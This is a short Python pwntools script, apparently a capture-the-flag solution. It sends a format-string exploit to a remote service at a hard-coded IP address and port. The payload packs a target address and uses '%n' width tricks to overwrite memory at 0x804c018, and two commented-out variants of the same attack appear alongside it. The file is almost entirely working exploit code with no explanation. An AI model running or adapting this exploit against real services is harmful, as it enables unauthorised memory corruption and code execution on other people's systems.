from pwn import *

#payload = p32(0x804c018)+p32(0x804c018+2)+'%37437x'+'%4$n'+'%30143x'+'%5$n'

p = remote('95.216.233.106',10034)

#payload = p32(0x804c018)+p32(0x804c018+2)+'%37437x'+'%4$n'+'%30x'+'%5$n'
payload = p32(0x804c018)+'%134517313X'+'%4$n'
print p.recv()
p.sendline(payload)
print p.recvall()[-100:-1]
